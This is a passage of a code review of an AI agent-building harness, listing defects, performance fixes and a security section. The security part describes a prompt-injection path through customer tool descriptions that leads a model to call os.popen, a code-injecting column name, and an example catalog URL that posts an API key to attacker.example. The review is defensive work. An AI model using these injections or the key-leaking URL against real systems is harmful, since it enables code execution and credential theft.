A `forget` of a non-message entry a tool appended mid tool batch is not widened to the surrounding exchange, so the compaction summary is spliced between an assistant tool-call turn and its tool results. Reproduced with `arm="tools"`: `to_wire` emits `assistant(tool_calls=[c1,c2]), user("[summary of earlier context]"), tool(c1), tool(c2)`, which no provider accepts, and the forget is accepted with `is_error False` reporting "about 0 tokens freed". Latent today, because `context_tools` is imported by no production module.

The window is hardcoded to 200,000 for every model, while the module's own docstring says a caller passes `window_for(model)` in and no caller does. The single `ContextConfig(` construction (`harness.py:78`) passes no window; neither `AgentHarness(` site passes `context=`. With the default the floor line is 80,000 tokens: for `anthropic/claude-opus-5` (1,000,000 window) it fires at 8% fill, for `openai/gpt-5.6-luna` (400,000) at 20%. Reachable on the `--agent` path, where `after_turn` runs at every `turn_end`; not on the default code-driver path, which emits no `turn_end`.

Fix: in `_units`, keep an assistant unit open across intervening non-message entries until a MessageEntry that is not one of its results appears. Add a `window` argument at `builder/agent.build_harness` and `examiner/agent.examiner_harness`, and have `rounds.py` pass `ContextConfig(window=budget.window_for(model_id))`, or make the default None and refuse to run the floor.

### R21. Three provider and ledger defects

`kullback/ai/provider.py:569` (`retry_after_seconds`), `:737` (`AnthropicModel.default_max_tokens`), `kullback/runner/budget.py:244` (`save_totals`).

- A `Retry-After` of `1s` or `in a bit` raises `ValueError` out of the middle of the retry loop; driven end to end over a MockTransport returning 429, the escape was `ValueError: Invalid date value or format "1s"` where a `ProviderError` was expected. The existing guard at line 570 is unreachable and no test covers a malformed value. Fix: wrap the parse and return None.
- Every Anthropic call is clamped to 4,096 output tokens. `AnthropicModel('anthropic/claude-opus-5').build_body(...)['max_tokens'] == 4096` while the real snapshot gives `limit.output = 128000`, and the OpenAI adapter sets no clamp at all. No `ModelConfig(` site overrides it; 4096 appears nowhere else in code, tests or docs. `docs/harness-design.md:74` says verbatim "There is no output clamp". Truncation is invisible: `stream.py:113` maps it to "length" and `agent/loop.py` branches on `stop_reason` only for "error". Fix: take `limit.output` from the models.dev entry the module already reads, fall back in the tens of thousands, and surface `stop_reason == "length"` as an error the loop can see.
- The money ledger is rewritten in place thousands of times per build with no temp file and no atomic rename. Truncating a valid `budget.json` to half its bytes makes both `load_totals` and `Ceiling.from_totals` raise `JSONDecodeError`, so the D86 resume path is gone; readers outside the lock exist at `tui/__init__.py:177` and `rounds.py:241`. The atomic pattern is already in the tree at `provider.py:279-282`. Fix: write a sibling temp file and `os.replace`.

### R22. Four phase-6 mechanisms that do not do what they say

`kullback/builder/extension.py:76`, `kullback/builder/repair.py:115` and `:191`, `kullback/builder/skills.py:166`.

- The D124 guard on an unacted ruling is released by any later call producing any one of the same artifacts, even one carrying no ruling. Reproduced: a tool producing `["tasks","intents"]` whose cluster ruling fails on tasks, then a tool producing only `["intents"]`; `harness.context.protected` is `{}` afterwards. `agent/context.py:474` is a plain dict with no refcount, and `protected` is the only thing between the entry and both `forget` and the 40% fallback compaction. Live in production: `rounds.py:162` builds the Builder harness with a SessionStore. The Examiner's copy keys guards on one `_key_of(call)` and does not have the defect. Fix: guard only the artifacts a ruling failed on, and release an entry only when every name still guarding it has been re-produced.
- The whole 214-line `repair.py` is reachable only from its own tests; no production module imports it. Within it, `ratchet_hook` reads `bodies.json` after the compile_tools stage has already overwritten it, and reads a nested shape the build never writes. Run against the flat shape `build.py:297` writes, it returns `ratchet_restored_body == "new-bad"` and appends "ratchet: kept prior passing body for calc", and writes nothing back. Fix: wire `repair_tools` and `ratchet_hook` into `builder/extension.py` or put an explicit "not yet wired" note at the top of the module; snapshot `bodies.json` before the stage runs and actually write the merged result; rewrite the test against the shape the build produces.
- The D132 skill gate uses the population standard deviation with a normal threshold. `skill_gate_decision([1, 1, 0])` returns `promote` with `z=2.449`; the unbiased sd gives 2.0 against a df-2 two-sided t of 4.303, and `[1,1,1]` promotes outright where a sign test gives p = 0.25. `SKILL_GATE_MIN_ROUNDS` is compared against artifact count while its reason string says rounds, so one round with three artifacts clears it, against D132's "evidence accumulated across rounds". Fix: an exact paired sign test over the non-zero pairs, which needs at least 5 non-tied pairs, and count rounds.

### R23. The shipped "generic in every domain" vocabulary is US-shaped

`kullback/builder/vocabulary.py:86` (`GENERIC_FIELDS`) and the `_folds_into` branch in `derive`.

The shipped patterns extract nothing from "my postal code is SW1A 1AA", "my postcode is M1 1AE", "my phone is +44 20 7946 0958" or "my name is Tanaka Yuki in kanji", and extract only "Ana Garcia" from "Ana Garcia-Lopez". `_folds_into('postal_code')` returns the zip spec and `_folds_into('phone_number')` returns the phone spec, and because `derive` calls `_folds_into` at line 278 before `_value_pattern` at line 287, a customer whose column is literally `postal_code` takes the US five-digit regex and its own evidence is never even computed. D115 decides the generic core is code because email, name, phone, address and postal code "are the same words in every domain", which is true of the words and false of the shapes.

Fix: move the `_folds_into` branch below `_value_pattern`, keep the corpus's pattern when there is one (union it into the generic spec) and merge only cues and aliases from the generic entry. Loosen the shipped patterns to shape-agnostic forms anchored on their cues.

### R24. Four efficiency findings with measured fixes, all applied and green

- `kullback/gates/verifier_suite.py:962` (`_mutation_gate`). Every value `check_run` derives before its atom loop depends only on `(run, tools, fn)`, and `_mutant` never rewrites `tool`, so all of it is recomputed per mutable atom. Split into `run_facts(run, tools, fn)` and `check_atoms(...)`, hoisted above the loop: 2,004 ms to 36 ms on a 59-event Run with 32 atoms, byte-identical output, 772 tests pass.
- `kullback/runner/canon.py:227` (`_strip_currency`). `rf"\b{re.escape(name)}\b"` is built per currency code per string value; one `check_run` shows 23,948 `re.search` and 23,948 `re.escape` calls, 56% of time inside `canon_value`. An `lru_cache` keyed on `tuple(rules.currency_codes)` returning compiled patterns: `check_run` 64.3 ms to 31.4 ms, `_mutation_gate` 2,004 ms to 1,145 ms, 113 tests pass. Do the same for `rules.id_patterns` in `_as_id`, which is inert on default rules and live after `learn_rules`.
- `kullback/gates/verifier_suite.py:597` (`hard_holds`). Re-runs `confine` and re-compiles a fixed source per (Run, atom) pair, 82% of a 4.88 ms call. Memoized on the exact source string: 4.88 ms to 0.34 ms, 772 tests pass. This does not widen the exec hole, `confine` is pure, code objects are immutable, and each call still gets a fresh `dict(SAFE_BUILTINS)`.
- `kullback/examiner/stage.py:240` (`derive_all`). The per-Task loop is serial while `build.py:680` already runs whole agent Runs through `parallel.each`. Adding `from kullback.builder.parallel import each` to `examiner/stage.py` breaks `lint-imports` ("kullback.examiner is not allowed to import kullback.builder"), so `each` has to move below that rank first. One correction to the plan: `probed` is carried across iterations, so decide `may_probe` for every Task before the pool starts, by Task order, or `--probe-limit` becomes nondeterministic.

### R25. Two architecture defects with mechanical fixes

- `kullback/runner/gate_support.py`. Eight modules under `gates/` import it and exactly one under `runner/` does (`boundary.py`, for one `gate()` call). `runner_version` hashes every `.py` under `kullback/runner/`, so a gate-helper edit moves the Runner hash and forces `freeze-runner` plus a full regrade in every workdir, which is exactly what the D122 runner/gates version split exists to avoid. Applied the whole move to `kullback/gates/support.py` with `boundary.py` building its `GateResult` directly: full suite 1,880 passed, `lint-imports` 3 kept 0 broken.
- `kullback/gates/__init__.py:198` (`rulings_over`). Gates are bound to Builder and Examiner store keys by bare string, and a name that no longer matches skips the gate with no record: `rulings_over({'bodies': {}, 'assisted_tools': []}, ['bodies'])` returns `['compile_tools']`, and renaming one key returns `[]` silently. `tests/gates/test_package.py:136` compares against a 28-name literal written inside the test, so it stays green through exactly that rename. Fix: derive the declared set from `build.stages(plan)`'s `outputs=(...)` tuples plus `ExaminerPlan`'s keys and assert every `spec.artifacts` name is in that union. Keep the skip in `rulings_over` as it is; a partial store is normal there.

### R26. Two duplicate readers of formats that already have owners

- `kullback/report.py:845` (`run_from_jsonl`). A second parser of the Run JSONL that `records.load_run_jsonl` owns, justified by a comment that report may not import the Runner, which is false: `report.py:13` already imports thirteen names from `runner.records` and no contract forbids it. They already disagree on files `loop.py` writes: a tool_result with `assisted: true` gives records `.assisted False` and report `.assisted True`, and `loop._footer` never writes an `assisted` header key, so records returns False on every real Run file. `verdict.py` and `gates/scorecard.py` compensate per event; `gates/round_end.py:51` does not. Fix: delete `run_from_jsonl` and `EVENT_TYPES`, move the assisted derivation into `records.load_run_jsonl`, and give it a tolerant wrapper returning None on an unparseable line so `report.load_runs` can still name the file.
- `kullback/builder/mine.py:61` (`_parse`). Four copies of "a recorded tool result, decoded when it is JSON in a string", one of which (`gates/tool_runs.parse_result`) documents itself as the shared one and is already called by `compile_env.py:157`. Behaviourally identical after checking the edge cases. Applied the swap in `mine` and `ingest`: no cycle, `lint-imports` 3 kept 0 broken over 288 dependencies, 1,030 passed.

---

## 3. Simplification

Ordered by lines removed per unit of risk. "Applied" means a verifier made the change and ran the suite.

Applied and green:

| Change | Lines | Result |
| --- | --- | --- |
| Delete `policy.reference_violations`, `_run_cases`, the `policy_gate` parameter and four tests (superseded by `examiner/reference.constraint_rates`) | 63 plus tests | 1,874 passed, 4 skipped. Invalidates the compile_policy stage cache once. |
| Move `runner/gate_support.py` to `gates/support.py`, `boundary.py` builds its own GateResult | 0 net, one file moved | 1,880 passed; `lint-imports` 3 kept. Fixes R25. |
| Consolidate seven hand-rolled `write_json` bodies onto `records.write_json` | about 30 | 1,878 passed. Keep the two trailing-newline sites byte-identical or change them deliberately. |
| Delete `mine._parse` and `ingest._parsed`, import `gates.tool_runs.parse_result` | 20 | 1,030 passed on the touched packages, no cycle. |
| `report.EVENT_TYPES` becomes `get_args(records.EventType)` | 8 | 1,878 passed. |
| `ledger._write` calls `records.write_json` | 3 | tests/gates 233 passed, then full suite. |
| Inline `derive._helpers_src` | 3 | 1,877 passed; edit only line 490 of the pinning test, the rest of it is load-bearing. |
| Delete `report.version_match` (no caller anywhere) | 9 | 1,878 passed. |
| Delete `agent/loop.user_message` (no caller anywhere) | 2 | 1,878 passed. |
| Delete `repair.ratchet_bodies`'s dead `out = dict(new)` | 1 | tests/builder/test_repair.py 7 passed. |
| Replace `compile_env._context_cap_error`'s unreachable except with a module-level import | 12 | 1,877 passed, ruff clean, no cycle, neither version hash touched. |
| Delete `vocabulary._stated_values`'s `by_id` dict | 3 | 13 passed. Also fixes a real bug, see the considers list. |
| Break the `ai.provider` / `ai.pricing` cycle with `ai/live.py` | +15 | 1,878 passed. Add a forbidden contract afterwards. |
| Hoist `_mutation_gate`'s run facts; memoize `hard_holds`; cache `_strip_currency` patterns | +30 | 772 and 113 tests pass, 55x, 14x and 1.75x respectively. |

Read and verified but not applied:

- Delete `gates/artifacts.py`'s `parses_gate`, `executes_gate`, `deterministic_gate`, `non_trivial_gate`, `compile_tools_gates` and only the two `compile_tools` spec rows at `gates/__init__.py:247-251`. About 120 lines. Production runs `tool_runs`' `body_*` family through `builder/sandbox.py`. Keep the `body_*` specs at 237-246; deleting those would delete the live path. The two implementations disagree on constant tools, which is a live divergence, not only duplication. `docs/tech/phase-4-builder-extension.md` already records this call and why it was deferred.
- Delete `artifacts.leak_gate` and the other four registered-but-uncalled rulings there, or move their "belongs in X" docstrings to `docs/todo.md`. About 90 lines. `oracle_replay_gate` is registered and says in its own docstring it is not wired.
- Delete `canon.record_hash` (no caller outside its own tests, no `__all__`, not reachable through `cli._entry`). 12 lines plus three tests.
- Delete `mine.reconstruct_truncated`, `exempt_from_reruns` and their five private helpers, or wire them. About 90 lines. D95's reconstruction is unkept by any build today.
- Delete `mine.gate_tools` and `skipped_user_calls`'s gate role, folding its three metrics into `gates/artifacts.mine_gate`, and point `tests/test_e2e.py:171` at the gate the build actually records. About 40 lines.
- Delete `mine`'s six LLM symbols, or give `_mine_stage` a model. `BuildPlan._wrap_models` has no `mine` key, so `sig.source = "llm"` is never set and both escape clauses never fire. About 130 lines either way, plus a correction to design section 4 item 3.
- Delete `sandbox.gate_refuses_unknown`'s unused `rules` parameter (2 lines) and `compile_env.py:37-40`'s four re-exports, or trim the comment that claims they serve callers.
- Delete `builder/repair.apply_ratchet` (zero callers including tests) and `repair_tools`' unread `sink` parameter.
- `Ceiling.add`, `_write_spend`, `StageContext.charge` and `Pipeline._charger` have no production caller. Deleting `StageContext.charge` fails three pipeline tests that cover the pipeline's own budget stop path, so this one is not free: either rewrite those three to spend through a `BudgetedModel` inside the stage, or keep the seam and say in the docstring that it is the entry for a non-model cost. D118 names `Ceiling.add` as a lock holder, so the decision log needs correcting alongside a deletion.

Structural moves worth doing, no lines removed: move `compile_env`'s D117 block (lines 818 to 992) plus its prompt builders into `builder/write_body.py`; move `build.py`'s Run-making half into `builder/runs.py` and factor the three `load_toolkit` plus `Router` blocks into one `_world_for(task, ...)`, which is where C2's defect currently sits three times over. Merge `gates/stages.py` (80 lines) into `gates/artifacts.py` (439), whose split rests on provenance rather than on any property of the gate.

---

## 4. Security

### What a customer's trace file can trigger today

1. **Identifier injection into the exec'd module (C2).** Mined table and column names come straight from tool-result JSON keys and db.json rows with no validation, and land in the module `load_toolkit` execs in the Runner's process. Demonstrated: a crafted column name ran `print` and an `import os` at module level, past a `gate_confined` that returned `passed=True` with zero failures. The benign twin is a hard denial of service: `class`, `order id`, `Content-Type` and `2nd_item` all fail the code-owned skeleton check unrepairably.
2. **Prompt injection into the body-writing stage.** `compile_env.py:739` (`_tool_block`) puts customer tool descriptions and recorded call results verbatim and unmarked into the user turn that asks a model to write a tool body. `mine.py:249` confirms `sig.description` comes from the trace's declared tool spec. Built a ToolSig whose description ends with an instruction to `import uuid` and call `uuid.os.popen`, and the sentence appears verbatim under "Description:" with no fence, label or escaping, in the same turn that carries the task. What stands between that reply and execution is the confinement gate, which C1 shows does not hold. Fix: delimit the customer-derived spans and say in the stable system prefix that everything inside them is data read off a log, the way `_confinement_block` already states the confinement rules, and record in `docs/todo.md` that trace text is untrusted input to this stage.
3. **The confinement bypasses themselves (C1)** are triggered by a model-written body, not directly by a trace, but 2 above is a channel from a trace into that body.

### Theoretical, or requiring an attacker who already has local access

- `ai/pricing.py:125` (`endpoint_from_catalog`). A third-party JSON catalog at `~/.cache/harness/models.dev.json`, a plain user-writable file, decides both the host an API key is posted to and which environment variable is read as that key, and the host is run through `${VAR}` substitution against the real environment. Built the exploit: an entry with `"api": "http://attacker.example/${ANTHROPIC_API_KEY}"` yields a post URL carrying the key. No scheme check anywhere on the path. Mitigation not in the original finding: the provider segment comes from the operator's own `--model` id, and anthropic and openai have their own adapters and never consult the registry, so a poisoned entry only bites a registry-resolved provider the operator asks for. Still worth fixing: require an absolute https URL and a conservative `key_env_var` pattern, refuse rather than fall through, and do not run a catalog-supplied string through `substitute_env`.
- `builder/policy.py:350` (`_sandbox`). The constraint-predicate subprocess inherits the whole environment including API keys, while the tool-body subprocess passes `env={}`. Two sandboxes for model-written code, two rules, neither docstring mentioning it. `-I` means the child needs no PYTHONPATH, so `env={}` costs nothing. Note that `reference_violations` (dead, see section 3) is the one call site that runs `_sandbox` with no `_static_check` at all.
- `builder/search.py:106`. The live-calls switch guards only the `search_for` factory, not the four transport methods, so anything constructing a provider directly reaches the network with the switch off. `provider.post` re-asserts the gate on the network path; the search providers do not. Note that `tests/conftest.py` patches `provider.ALLOW_MODEL_REQUESTS`, which `live_allowed` never reads, so the search half of the switch is currently outside the test suite's guarantee. Applying the fix fails 5 of 8 search tests, which need the `live` fixture pattern from `tests/ai/test_provider.py:19`.
- `runner/route.py:151` (`_reads_synthetic`). A synthetic row is detected by substring search over the JSON dump of the result and arguments, so a short id matches anything containing those characters: with `synthetic_rows=['7318']`, a row with `phone: '+1-555-7318-22'` came back `assisted=True`. `synth._mutate_digits` keeps the customer's own id shape, so short ids are exactly what a short-id corpus produces. Retail's `#W0000000` shape is long enough to hide it. Fix: walk the parsed values and compare whole scalars, which `user_sim._is_synthetic` already does.

---

## 5. Generality

Places the harness is fitted to tau2 retail rather than to customers in general. `docs/todo.md` records some of these; the ones marked new are not recorded anywhere.

| Site | The fit | Cost |
| --- | --- | --- |
| `gates/verifier_suite.py:164` `_entity` | ids named `<entity>_id`, `_id` or `_ids` | New. D102 retired this rule in the miner for exactly airline's `flight_number`. Costs the wrong-entity discrimination and makes `agreed` order-dependent. See R9. |
| `gates/tool_runs.py:181` `classify_exception` | English keyword matching, docstring claims shape | New. Fails bodies that reproduce the recorded message verbatim. See R10. |
| `runner/verdict.py:98` `_is_transfer` | `transfer`/`escalate` substrings | New. Misclassifies `transfer_money` as a handoff; the miner's equivalent rule is correctable and this one is not. See R11. |
| `builder/vocabulary.py:86` `GENERIC_FIELDS` | US zip, US phone, ASCII two-word names | New. A `postal_code` column takes the US regex and its own evidence is never computed. See R23. |
| `builder/user_sim.py:31` `OPEN_REQUEST` and friends | object nouns are item, items, one, option, options, product | New. "Which flight would you like to book?" and "Which line would you like to add the plan to?" both miss, and the user answers "Okay, thank you." The yes vocabulary is spelled four times across three modules and two of the spellings differ. |
| `builder/user_sim.py:280` `_row_value` | three synonym groups plus retail's `address1/address2/city/state/zip` | Recorded: D115 names `_row_value`'s hand-mapped aliases as the remainder it left. The Vocabulary the simulated user already holds is not consulted. |
| `builder/mine.py:977` `id_columns` | one mixed-shape result disqualifies a column | New. `flight_number` is exactly the case D102 exists for. See R13. |
| `builder/intent.py:80` `_earlier_view` | `<entity>_id` only, no bare `id` | New. A CRM or ticketing corpus keyed by `id` gets the wrong write span. See R13. |
| `builder/build.py:601` `PROBE_TURNS = 6`, `max_turns = 30` | constants sized on retail, neither derived from the corpus nor behind a flag | Six is fixed by D108 and arguable; thirty is in no decision and overrides `loop.new_run_state`'s own default of 20. A probe that runs out of turns is scored as the Verifier resisting the loophole, with no termination reason in the metrics. |
| `builder/synth.py:727` `round(total, 2)` | currency-shaped constant | On a domain whose values sit below the rounding step (amounts near 0.0005) the stored total is written as 0.0 on every synthetic row with `checks ok True`. In currency the error is bounded below `SUM_TOLERANCE`, so this is generality, not a live retail bug. |
| `builder/synth.py:886` `verify` | duplicate-id check is global across tables | A corpus that keys an invoice by its order's id reports 12 duplicate_ids on observed rows and fails the check, which `build_starting_state` turns into a build assumption. `docs/synthetic-rows.md` asks for uniqueness of generated ids against observed ones, not global uniqueness. |
| `builder/synth.py:665` `_resolve_counts` | implied parents resolved one level deep | A three-level chain leaves synthetic rows hanging off observed parents that never list them back, `checks ok True`. Needs a hand-built world; no corpus in the repo has one. |
| `runner/route.py:151` `_reads_synthetic` | substring match, safe only for long ids | See section 4. |
| `runner/boundary.py:161` `_is_verifier` | scans for a module named `verifier`, which no longer exists, and does not know `kullback.examiner` | Stale check, no hole: `lint-imports` catches a real runner-to-examiner import. |

Two things worth saying in the harness's favour here. Most of these are single named functions with a one-line or one-argument fix, not a pervasive shape. And the repo's own `docs/cross-domain-check.md` already records the `_entity` convention failing on airline, so the team found the class before this review did.

---

## 6. Considers and nits

- `compile_env.py:1109` `call_starting_states`: one `deepcopy` of the whole world per Task, all of them serialized into `job.json` per gate run. 205 deep copies of tau2's 2.8 MB db took 42.6 s and 1.1 GB maxrss.
- `compile_env.py:1052` `_failure_text`: held-out calls are hidden by matching rendered argument text, so a shown call's failure is suppressed when a held-out call carries the same arguments.
- `compile_env.py:559` `load_toolkit`: re-confines and re-compiles the identical source per Run; 47% of a 24.8 ms call is repeat parsing.
- `compile_env.py:331` `_build_overlays`: `content_hash` evaluated on every member observation because `setdefault`'s default is always evaluated; the O(observations x Tasks) walk is the scaling risk, the eager hashing is today's bill.
- `build.py:581` `_write_runs_index`: fully parses every Run of every Task after every re-roll batch, 925 ms per call at 456 files.
- `build.py:906` `_seed_ids`: dead defensive `except PipelineError`; the branch is unreachable.
- `build.py` is 1,166 lines and holds two separable things; design section 10 still records 497.
- `mine.py:1235` `mine_schema`: `nested_rows` walks and JSON-parses the corpus twice in a row with identical arguments.
- `cluster.py:242`: the `split_by_world` loop is indented two spaces where the file uses four; ruff's selected rules do not catch it.
- `synth.py:566` `_back_refs`: full parent-by-child cross product, four times per doubling; 1.16 s on the full tau2 retail seed, no build in the repo reaches the painful size.
- `search.py:190` `Chain._first`: catches three exception types, so a provider answering 200 with an unexpected shape kills the chain instead of falling through.
- `search.py:292` `live_allowed`: strict `== "1"` while `provider.py` accepts 1, true, yes and on, so `HARNESS_ALLOW_MODEL_REQUESTS=true` turns models on and search off.
- `user_sim.py:195`: `incomplete_reasons` and `walk_away` are derived and drive nothing; `walk_away` also misfires on "28236, thanks for your help".
- `vocabulary.py:129` `_stated_values`: `by_id` is a dict built only for a truthiness test, and its false branch counts the whole conversation as said before the call. Fixed by deleting the dict.
- `vocabulary.py:352` `enrich` and `memory.judge_lessons` are the only model-calling stages after compile_tools not handed `plan.workers`; D118's closing sentence names both as next.
- `memory.py:958` `evidence_in_material`: passes on a one-character string when any policy span is present; the lesson path is dormant, so fix the floor before lessons start being written.
- `memory.py:362` `snapshot_files`: walks `__pycache__`, so a Builder version's `files_hash` changes on recompile.
- `skills.py:114` `write_skill`: writes no version history and creates no memory-tree node, so the gate's revert and demote decisions have nothing to restore; two docstrings overclaim, one of them a tool description the model reads.
- `skills.py:179`: an alpha outside the three-entry lookup silently uses 1.96 while the record reports the alpha asked for. Use `NormalDist().inv_cdf`; keep `import math`, `math.sqrt` is used twice.
- `builder/agent.py:84` `run_builder`: a session that calls some other Builder tool but never `build` returns a success dict naming the target it never built.
- `report.py:133` `flagged_tool_verdicts`: counts a regraded Run once per Verdict file, the double count `current_verdicts` exists to prevent.
- `report.py:300` `_cell`: escapes a bar but not a newline, so a gate failure carrying one shifts every column after it. Reachable through `sandbox.py:108`'s `str(exc)` from a model-written body, where a pydantic ValidationError is multi-line.
- `report.py:781` `EVENT_TYPES`, `report.py:1087` double `gates.json` read: both nits, both applied and green.
- `cli.py:136` `_name_causes`: the Run handed to the D88 cause judge as the Reference is whichever stored Run sorts first, and with one stored Run it is the failed Run itself.
- `cli.py:206` `_score`: both agentic judges are asked about every atom of every stored Run before the version cache is consulted, so a repeat pass is not free as the docstring claims. Do not fix by dropping the answers from `cache_key`; `regrade.py:47-51` keeps them there on purpose.
- `cli.py:212` `_entry`: production defaults a gate to passed with a comment saying it does so because a test double is thin, which CONTRIBUTING forbids. `_entry`'s deferred-import purpose is real (cli imports in 0.30 s, rounds in 0.50 s), so replace it with function-local imports rather than module-scope ones.
- `tui/__init__.py:294` `Screen.command`: an unbalanced quote raises `ValueError: No closing quotation` out of `command` and out of `loop`, killing the screen.
- `tui/__init__.py:70` and `:212`: the typed-event mapping and the round-counts unpacking are each duplicated (three renderers for the counts, including `cli._round_line`, which shows a key neither other one does).
- `gates/round_end.py:68` `done`: a build where no Task has a confirmed Reference is done vacuously after round one. Deliberate and pinned by a test; D114's scorecard guard means nothing green ships, but the loop stops before the Builder gets a round to repair the tools that made every replay unconfirmed.
- `gates/artifacts.py:270` `environment_gate`: the "synthetic rows are tagged" half cannot fail, because the caller fabricates the tags one line before the gate reads them. Replace with a check that the ids are present in the db.json the gate already loads; do not look for a `synthetic` key inside rows, D40's tag is a list on the schema.
- `gates/artifacts.py:227` `_run_predicate`: the docstring's account of what the static check misses is stale twice over.
- `gates/verifier_suite.py:944` `_spans_gate`: check 1's ordering test is unreachable for `user_stated` and `user_elicited` atoms, because it sits after the branch that consumed them. Reachable only through a model-supplied atom.
- `gates/verifier_suite.py:268` `_token_in`: the Python matcher and the generated-source matcher have already drifted on dict values. Do not try to generate one from the other; pin them with a parametrized parity test.
- `gates/scorecard.py:55`: Verdict agreement reads `verdicts.json`, which nothing writes, and `reference_verdicts.json` in a shape its only producer does not emit. `docs/todo.md` already plans to delete these lines under D112.
- `gates/ledger.py:43`: reimplements `records.write_json` byte for byte and writes in place. Applied the consolidation, green.
- `runner/judge.py:347`: the disagreement-queue row carries `verdict_c` but never `judge_c`, so the third sample's cited spans are dropped and `report.py:740`'s rendering is unreachable.
- `runner/canon.py:638` `_unordered_columns`: full cross product per column; 3.56 s at 4,000 rows, 0.144 s with the grouping fix, which is behaviour-identical and applied green.
- `runner/replay.py:155` `compare_call`: `BOTH_REFUSED` counts as agreement without comparing error classes, so a Reference is confirmed on a Trace whose call the Environment could not answer at all (`tool_not_found`). `tool_runs` rules the same comparison differently.
- `runner/route.py:177` `_error`: a call nothing could answer is recorded with route "code", so `route_counts` is not a count of what answered.
- `runner/boundary.py:199` `runner_version` and `:161` `_is_verifier`: see R25 and the generality table.
- `runner/budget.py:359` `estimate_to_finish`: mixes units, mean cost per model call times number of stages remaining, and `_stop_report` names the model id where D86 asks for the tool or Verifier.
- `examiner/extension.py:71` `names_forbidden_path`: the path guard walks probe events, which are customer trace content, so a Reference whose data contains `tools`, `env`, `sandbox` or `overlays` cannot be probed. A probe carrying `https://api.acme.com/v2/tools/list` is blocked.
- `examiner/tools.py:531` `_repair`: every repair runs the loophole probe uncounted against `--probe-limit`, so the flag bounds one derive pass rather than the build.
- `examiner/plan.py:189` `task_runs_of`: one derive parses each Reference JSONL five times and every `load_state` re-parses every Run of every Task.
- `examiner/derive.py:156` `export_tau2_actions`: unreachable while a divergent second implementation (`compile_env._tau2_task`) runs; the live one drops `requestor` and emits an "action" whose name is a description string.
- `agent/loop.py:226` `execute_tool_call`: `tool_result` hooks get the original ToolCall, not the rewritten arguments the tool ran on.
- `agent/context.py:732` `_fallback`: once every free unit is the floor's own previous summary, it re-summarizes it every turn for one model call each without getting under the line. Record a `floor_stuck` count instead.
- `agent/context.py` is 809 lines and the agent core's 2,479 have no size band anywhere in the design, so CONTRIBUTING's rule cannot be applied to them.
- `docs/harness-design.md:142`: section 4 and section 12 item 7 describe a layout the code does not have (`src/`, `builder/verifier.py`, a `validate.py` that is now 15 lines), superseded by D129, D123 and D122 respectively, and CONTRIBUTING makes this document authoritative. `docs/architecture.md` does not exist.
- `scripts/env_fidelity.py`: `Reference.__init__` discards stderr and reads without a timeout, so a `--venv` without tau2 surfaces as a bare `JSONDecodeError`; `ours` re-confines and recompiles per recorded call (about 37 ms of 150); `cause` labels a value permutation as `result_shape`; `plain` redefines `records.plain` on line 136 while importing from records on line 41.
- `scripts/xdomain_check.py:227`: a synthetic row absent from the real db is counted `not_in_real_db` because the absence test runs before the synthetic test.
- `builder/repair.py:89` and `skills.py:108`: two JSONL appends that drop the `ensure_ascii=False` every other JSONL writer sets; `records.py` owns `read_jsonl` with no write-side counterpart.
- `builder/build.py:202` `_rows_of`, `mine._result_rows` and `xdomain_check._result_rows` are the same five-line helper three times.
- `builder/agent.py` and `examiner/agent.py`: `_model_driven` is byte-identical after two renames, and the two harness builders share a six-line body.
- `builder/extension.py:65` and `examiner/extension.py:117`: both `tool_result` hooks end in the same five-line rulings tail.
- `records.read_json` has six lookalikes, but two of them are strict copies rather than tolerant readers and one is in a script that imports no kullback, so only `scorecard._load` and `ledger._read` are worth folding. The strict/tolerant split elsewhere is the correct design, not drift.

---

## 7. What to do first

Each item is sized for one change of about 300 lines. Refactoring and behaviour changes stay in separate changes, per the house rule.

1. **Close the confinement bypasses.** `gates/confinement.py`: refuse leading-underscore attributes, apply `DENIED_ATTRS`, add the module-attribute rule, refuse a dunder in a string constant. One test per leaking module (uuid, random, typing, statistics, collections, json) asserting `gate_confined(...).passed is False`, plus the `str.format` case. Behaviour change, no refactor. (C1)
2. **Validate rendered identifiers and widen the confinement walk.** `compile_env.render_data_model` gets `_as_identifier` with `Field(alias=...)` and an assumption record; `source_confinement` walks module-level and class-body statements with the skeleton allowlisted by content hash. Tests for the injection case and for the benign `class` / `order id` / `Content-Type` cases. Behaviour change. (C2)
3. **Delimit customer text in the body-writing prompt.** `compile_env._tool_block` plus the stable system prefix, and a `docs/todo.md` line saying trace text is untrusted input to this stage. Small, and it belongs with 1 and 2. (Section 4 item 2)
4. **Price calls by the id the ceiling validated.** `budget.BudgetedModel.query` passes `self.model_id`, `Cost` gains `model_reported`, `pricing.price_from_catalog` returns None on an ambiguous bare id, `report.py` surfaces `unpriced_calls`. Tests: the dated-echo case, the multi-provider bare id, the missing cache_write. Behaviour change. (C3)
5. **Make `starting_state` read its own artifact.** Thread `inputs["synthetic_rows"]` to the three `Router` sites and to the schema copy `_environment_stage` passes on. Test: two builds with `grow` in one workdir, equal `env_id` and equal `synthetic_rows`. Do this before item 6, since both touch `build.py`. (C4)
6. **Fix the three narrowing and caching defects in `build.py`.** Ingest key hashes bytes; `rerolls.json` written and read back the way `replays.json` is; the grow narrowing persisted on the plan and extended to `build_environment`. Three tests. Behaviour change. (R6, R7)
7. **Stop a model's opinion becoming a pass.** `atom_context.env` hands out deep copies, `covered` snapshotted before the non-write atoms, `wrote(self, tool, /, **fields)`. Tests: the `or True` hard atom, the swallowed-exception variant, the `pre_state` mutation, and the `tool`/`self` argument collision. Behaviour change. (R1, R8)
8. **Give the judges tools and the third sample independence.** Read-only Starting-state and End-state tools in `judge.py`, `cli._judges` passes them, `__init__` raises on an empty tool set, `third_judge` gets a distinct persona and refuses a construction matching judge B, the pairs row records `split`. Behaviour change. (R2)
9. **Give the report's split a real input.** Classify replays, re-rolls and Candidate Runs off what the records carry; refuse to publish a Candidate pass rate when the split has no input. Fix `flagged_tool_verdicts`' double count and `_cell`'s newline while in the file. (R3, two considers)
10. **Fix the tool gates that pass on nothing.** `run_gates` returns `insufficient_evidence` on an empty call list and `compile_tool` marks the tool assisted; `_RUNNER` deep-copies per call. Two regression tests. Behaviour change. (R4)
11. **Let a customer-first Trace replay.** `replay_trace` drives `TraceUser` when the Trace opens with a user turn, `_Script.take` hands a turn of the other role to that speaker, `gaps` means unconsumed. Two fixtures. While in the file, make `BOTH_REFUSED` compare error classes. Behaviour change. (R5, one consider)
12. **One error classifier.** Lift `ingest._rule_class` into a shared pure function beside the D67 records, point `classify_exception` and `route._class_of` at it, delete the substring chain. Test that a body raising the recorded message passes the fidelity gate. Behaviour change. (R10)
